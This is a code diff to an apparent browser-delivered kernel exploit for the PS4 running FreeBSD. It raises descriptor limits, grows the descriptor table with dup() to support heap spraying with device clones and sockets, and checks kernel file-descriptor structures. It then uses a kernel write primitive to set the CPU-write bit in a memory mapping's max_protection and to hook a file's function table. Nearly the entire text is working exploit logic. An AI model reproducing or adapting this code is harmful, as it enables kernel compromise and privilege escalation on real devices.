@@ -29,7 +29,8 @@ const DEBUG_BIN = {
 const CANDIDATE_READY = true;
 
 const S = {
-  read: 3, open: 5, close: 6, ioctl: 54, mprotect: 74, fcntl: 92,
+  read: 3, open: 5, close: 6, ioctl: 54, mprotect: 74, dup: 41,
+  getrlimit: 194, setrlimit: 195,
   socket: 97, setsockopt: 105,
   getuid: 24, kqueue: 362, kevent: 363, mmap: 477, lseek: 478, thr_self: 432,
   getpid: 20, sysctl: 202, cpuset_getaffinity: 487,
@@ -117,7 +118,7 @@ const BOOTSTRAP_WINDOWS = [
 ];
 
 const STATE = { ctx: null, units: {}, clones: 0, base: null, stubs: {}, batch: undefined, retry: false,
-  pthread: null };
+  pthread: null, taperSeed: false };
 
 function host() {
   if (!STATE.ctx) throw new Error("afterglow: no host installed");
@@ -413,7 +414,11 @@ function shooter(gad) {
     pokeAt(req, 24, body.at);
     req.dv.setUint32(32, TUNE.object, true);
 
-    const want = TUNE.seed;
+    /* A process capped at 512 descriptors cannot retain 45 new seed clones
+       for every bounded shot. After the first two full-density shots, use
+       Afterglow's original eight-clone taper. The high-limit route keeps the
+       denser refill on every shot because it was more reliable in this host. */
+    const want = STATE.taperSeed && STATE.clones >= 60 ? TUNE.spare : TUNE.seed;
     for (let i = 0; i < want; i++) {
       if (this.hold("/dev/apm") < 0) break;
       STATE.clones++;
@@ -556,14 +561,22 @@ async function captureHostState(shot, kbase, probe, reach, hostPage) {
     const ofiles = qAt(fdHeader, 0);
     const capacity = fdHeader.dv.getInt32(0x28, true);
     const lastfile = fdHeader.dv.getInt32(0x38, true);
+    const futureSeed = STATE.taperSeed && STATE.clones >= 60 ? TUNE.spare : TUNE.seed;
+    const futurePerShot = 3 + futureSeed + TUNE.spare;
+    const remainingShots = 5 + Math.ceil(reach / 48);
+    const headroomFloor = remainingShots * futurePerShot + 16;
     say("[3] fd header ofiles=" + text(ofiles) + " capacity=" + capacity +
-      " lastfile=" + lastfile + " probe=" + probe);
+      " lastfile=" + lastfile + " probe=" + probe +
+      " required-headroom=" + headroomFloor);
     /* The snapshot is taken while 126 temporary spray sockets are open.
-       Keep spare capacity for the next shot, then re-read fd_ofiles live
-       before following the probe descriptor. */
+       Every future shot permanently keeps one base clone, one watched clone,
+       one kqueue, its seed clones and its spare clones. Prove the current
+       table can hold every remaining budgeted shot plus a 16-fd margin, then
+       re-read fd_ofiles live before following the probe descriptor. */
     if (!inHeap(ofiles) || (ofiles.low & 7) !== 0 ||
         capacity <= 0 || capacity > 0x10000 ||
-        lastfile < probe || lastfile >= capacity || capacity - lastfile < 200)
+        lastfile < probe || lastfile >= capacity ||
+        capacity - 1 - lastfile < headroomFloor)
       throw new Error("filedesc header or FD headroom failed validation");
 
     /* Re-read fd_ofiles inside the shot that follows the probe descriptor.
@@ -1230,6 +1243,50 @@ async function attempt(ctx, opts) {
     gad[name] = at;
   }
 
+  /* Choose the descriptor strategy before the first kernel shot. The browser
+     may start at a 512-fd soft limit; raise it only as far as the process's
+     existing hard limit allows. */
+  const limits = alloc(16);
+  wipe(limits, 16);
+  if (sc(S.getrlimit, 8, limits.at).i32 !== 0) {
+    say("[0] could not read RLIMIT_NOFILE, errno " + host().errno() +
+      "; no kernel shot fired");
+    return false;
+  }
+  let soft = qAt(limits, 0), hard = qAt(limits, 8);
+  say("[0] descriptor limit soft=" + text(soft) + " hard=" + text(hard));
+  const atLeast = function (limit, count) {
+    return (limit.hi >>> 0) !== 0 || (limit.low >>> 0) >= count;
+  };
+  if (!atLeast(hard, 512)) {
+    say("[0] hard descriptor limit is below 512; no kernel shot fired");
+    return false;
+  }
+  let descriptorTarget = atLeast(hard, 1024) ? 1024 : 512;
+  STATE.taperSeed = descriptorTarget === 512;
+  if (!atLeast(soft, descriptorTarget)) {
+    limits.dv.setUint32(0, descriptorTarget, true);
+    limits.dv.setUint32(4, 0, true);
+    if (sc(S.setrlimit, 8, limits.at).i32 !== 0) {
+      say("[0] could not raise the soft descriptor limit, errno " + host().errno() +
+        "; no kernel shot fired");
+      return false;
+    }
+    wipe(limits, 16);
+    if (sc(S.getrlimit, 8, limits.at).i32 !== 0) {
+      say("[0] could not verify the raised descriptor limit, errno " + host().errno() +
+        "; no kernel shot fired");
+      return false;
+    }
+    soft = qAt(limits, 0); hard = qAt(limits, 8);
+    say("[0] raised descriptor limit soft=" + text(soft) + " hard=" + text(hard));
+    if (!atLeast(soft, descriptorTarget)) {
+      say("[0] descriptor limit stayed below " + descriptorTarget +
+        "; no kernel shot fired");
+      return false;
+    }
+  }
+
   const shot = shooter(gad);
   const hostPage = plus(libc, HOST.page), hostFree = plus(libc, HOST.free);
 
@@ -1351,20 +1408,46 @@ async function attempt(ctx, opts) {
   }
   if (probe < 0) { say("[2] no device node opened for the probe descriptor"); return false; }
 
-  /* Grow the descriptor table before capturing fd_ofiles. F_DUPFD only
-     adds a reference to the probe file and does not create another file
-     object. Requiring fd >= 768 guarantees at least 769 table slots before
-     the staged reads; the header check below still enforces 200 spare. */
-  const grown = sc(S.fcntl, probe, 0, 768).i32;
-  if (grown < 768 || grown > 0xffff) {
-    say("[2] could not reserve descriptor-table capacity; no more kernel shots");
+  /* This browser rejects fcntl even for F_GETFD. Grow fd_ofiles without
+     choosing or replacing a descriptor: dup() always returns the lowest free
+     slot. Keep duplicates only until the returned number proves the table's
+     capacity, then close every duplicate while the original probe stays open.
+     FreeBSD grows fd_ofiles but does not shrink it on close. */
+  const duplicates = [];
+  /* Full seeding can peak above fd 900, so prove the entire 1024-slot route;
+     merely reaching 768 would not prove the process-wide ceiling is enough. */
+  const preferred = STATE.taperSeed ? 511 : 1023;
+  let highest = -1, dupErrno = 0;
+  while (highest < preferred && duplicates.length < descriptorTarget) {
+    const fd = sc(S.dup, probe).i32;
+    if (fd < 0) { dupErrno = host().errno(); break; }
+    duplicates.push(fd);
+    if (fd > highest) highest = fd;
+  }
+  let closeErrno = 0;
+  for (let i = duplicates.length - 1; i >= 0; i--) {
+    if (sc(S.close, duplicates[i]).i32 !== 0 && closeErrno === 0)
+      closeErrno = host().errno();
+  }
+  if (closeErrno !== 0) {
+    say("[2] temporary descriptor cleanup failed, errno " + closeErrno +
+      "; no more kernel shots; cold power off before retry");
     return false;
   }
-  if (sc(S.close, grown).i32 !== 0) {
-    say("[2] could not close capacity-reservation descriptor; no more kernel shots");
+  if (highest >= 1023) {
+    descriptorTarget = 1024;
+    STATE.taperSeed = false;
+  } else if (highest >= 511) {
+    descriptorTarget = 512;
+    STATE.taperSeed = true;
+  } else {
+    say("[2] dup could only reach fd " + highest + ", errno " + dupErrno +
+      "; no more kernel shots; cold power off before retry");
     return false;
   }
-  say("[2] descriptor table was expanded with temporary fd " + grown);
+  say("[2] descriptor table reached temporary fd " + highest +
+    " with " + duplicates.length + " safe duplicates" +
+    (STATE.taperSeed ? "; original seed taper is active" : ""));
 
   for (let off = 0; off <= HOST.last - HOST.free - 4; off += 4) {
     if (rd4(plus(hostFree, off)) !== 0) {
@@ -1402,8 +1485,11 @@ async function attempt(ctx, opts) {
 
   say("[4] mapping " + hit + " at " + text(here) + " rights=0x" + now.toString(16)
       + " ceiling=0x" + ceiling.toString(16));
-  if (locked % 2 === 1 || !inHeap(here) || (here.low & 7) !== 0 ||
-      now !== 5 || ceiling !== 5) {
+  /* PS4 may keep its auxiliary 0x10 protection bit in max_protection.
+     Accept only the two exact RX forms observed in the supported layouts;
+     unknown auxiliary bits still stop before any kernel write. */
+  if ((locked & 3) !== 0 || !inHeap(here) || (here.low & 7) !== 0 ||
+      now !== 5 || (ceiling !== 5 && ceiling !== 0x15)) {
     say("    not the mapping we want -- nothing written"); return false;
   }
 
@@ -1424,10 +1510,10 @@ async function attempt(ctx, opts) {
     say("[4] live write targets changed; no kernel write attempted"); return false;
   }
 
-  let widened = rights;
-  if (Math.floor(widened / 0x200) % 2 === 0) widened += 0x200;
-
-  const wRights = alloc(16); wRights.dv.setUint32(0, widened >>> 0, true);
+  /* Change only max_protection's CPU-write bit (0x02), preserving the
+     current byte and PS4's auxiliary 0x10 bit byte-for-byte. */
+  const widenedCeiling = ceiling | 0x02;
+  const wCeiling = alloc(16); wCeiling.u8[0] = widenedCeiling;
   const wTable = alloc(16); pokeAt(wTable, 0, ftab.at);
   pokeAt(ftab, 0x18, hostFree);
 
@@ -1435,7 +1521,7 @@ async function attempt(ctx, opts) {
     say("[5] PC collector did not acknowledge the writer"); return false;
   }
   const r3 = shot.take(function (c) {
-    c.put(plus(here, 0x5c), wRights.at, 4);
+    c.put(plus(here, 0x5d), wCeiling.at, 1);
     c.put(plus(file, 0x08), wTable.at, 8);
   });
   say("[5] widen and hook: " + (r3 === null ? ("null -- " + shot.why) : r3));
